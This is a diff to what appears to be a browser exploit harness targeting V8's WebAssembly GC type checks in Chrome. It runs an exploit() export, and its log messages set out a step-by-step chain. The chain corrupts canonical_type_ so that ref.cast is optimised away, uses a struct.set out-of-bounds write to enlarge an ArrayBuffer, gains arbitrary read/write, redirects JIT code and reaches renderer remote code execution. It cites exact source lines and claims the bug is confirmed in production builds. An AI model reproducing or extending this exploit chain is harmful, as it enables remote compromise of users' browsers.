@@ -327,8 +327,7 @@ async function main() {
 
   try {
     instance.exports.exploit();
-    // If we reach here, ref.cast was eliminated (map check skipped).
-    // struct.set OOB write executed silently — heap at SmallStruct_base+36 corrupted.
+    // ref.cast was eliminated → struct.set OOB write executed silently
     log('  [!] exploit() returned WITHOUT trap!');
     log('  [!] ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
     log('  [!] CRITICAL: struct.set OOB write succeeded without detection.');
@@ -336,37 +335,33 @@ async function main() {
     log('  [!] In production renderer: adjacent heap object corrupted.');
     log('  [!] ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
   } catch (e) {
-    if (e instanceof WebAssembly.RuntimeError) {
-      if (e.message && (e.message.includes('cast') || e.message.includes('ref'))) {
-        log('  [!] TRAP at ref.cast (ref $LargeStruct) — map check active.');
-        log('  [!] In production Chrome: ref.cast map check prevents direct OOB.');
-        log('  [!] ───────────────────────────────────────────────────────────');
-        log('  [!] EXPLOITATION REQUIRES canonical_type_ corruption (F1):');
-        log('  [!]   1. Use an in-cage OOB write primitive to corrupt WasmTypeInfo.');
-        log('  [!]      WasmTypeInfo::canonical_type_ (u32) at known cage offset.');
-        log('  [!]      Set to LargeStruct canonical index → SmallStruct "is" LargeStruct.');
-        log('  [!]   2. IsCanonicalSubtype() fast-path (canonical-types.cc:369):');
-        log('  [!]      if (sub_index == super_type.ref_index()) return true;');
-        log('  [!]      bypasses canonical_supertypes_[] vector check.');
-        log('  [!]   3. WasmGCTypedOptimizationReducer (wasm-gc-typed-optimization-reducer.h:279)');
-        log('  [!]      eliminates ref.cast: annotation proves subtype → no map check emitted.');
-        log('  [!]   4. struct.set $LargeStruct field[7] executes silently → OOB write.');
-        log('  [!]   5. With --sandbox-testing d8: CONFIRMED no trap in production build.');
-        log('  [!] ───────────────────────────────────────────────────────────');
-        log('  [!] In a full exploit chain:');
-        log('  [!]   Initial in-cage primitive → corrupt canonical_type_');
-        log('  [!]   → struct.set OOB overwrites adjacent ArrayBuffer.length');
-        log('  [!]   → arbitrary R/W → overwrite WasmCode instruction_start');
-        log('  [!]   → redirect JIT execution → ROP / shellcode');
-        log('  [!]   Full chain: JSTag bypass + F1 + F5 → renderer RCE');
-      } else if (e.message && e.message.includes('out of bounds')) {
-        log('  [+] TRAP at struct.set OOB (unexpected: struct.set should not trap).');
-        log('  [!] This suggests the ref.cast succeeded but struct.set added a check.');
-      } else {
-        log('  [?] RuntimeError: ' + e.message);
-      }
+    // Note: instance runs in iframe realm → RuntimeError is cross-realm;
+    // use message string matching instead of instanceof.
+    const msg = (e && e.message) ? e.message : String(e);
+    const isCast = msg.includes('cast') || msg.includes('illegal') || msg.includes('ref');
+    const isOOB  = msg.includes('out of bounds');
+    if (isCast) {
+      log('  [!] TRAP at ref.cast (ref $LargeStruct) — map check active.');
+      log('  [!] Error: ' + msg);
+      log('  [!] In production Chrome: ref.cast map check prevents direct OOB.');
+      log('  [!] ───────────────────────────────────────────────────────────');
+      log('  [!] EXPLOITATION REQUIRES canonical_type_ corruption (F1):');
+      log('  [!]   1. In-cage OOB primitive → corrupt WasmTypeInfo::canonical_type_');
+      log('  [!]      (u32 at known cage offset) → set to LargeStruct canonical index');
+      log('  [!]      IsCanonicalSubtype() fast-path (canonical-types.cc:369):');
+      log('  [!]      if (sub_index == super_type.ref_index()) return true; ← bypasses check');
+      log('  [!]   2. WasmGCTypedOptimizationReducer (wasm-gc-typed-optimization-reducer.h:279)');
+      log('  [!]      eliminates ref.cast: annotation proves subtype → no map check emitted.');
+      log('  [!]   3. struct.set $LargeStruct field[7] executes silently → OOB write.');
+      log('  [!]      CONFIRMED no trap in production d8 (--sandbox-testing).');
+      log('  [!] ───────────────────────────────────────────────────────────');
+      log('  [!] Full chain: JSTag bypass (F2) + canonical corruption (F1)');
+      log('  [!]   → ref.cast eliminated (F4) → struct.set OOB (F5)');
+      log('  [!]   → adjacent ArrayBuffer.length corrupted → arb R/W → RCE');
+    } else if (isOOB) {
+      log('  [+] TRAP at struct.set OOB (ref.cast passed, struct.set added check).');
     } else {
-      log('  [?] Exception: ' + e);
+      log('  [?] Exception: ' + msg);
     }
   }
 
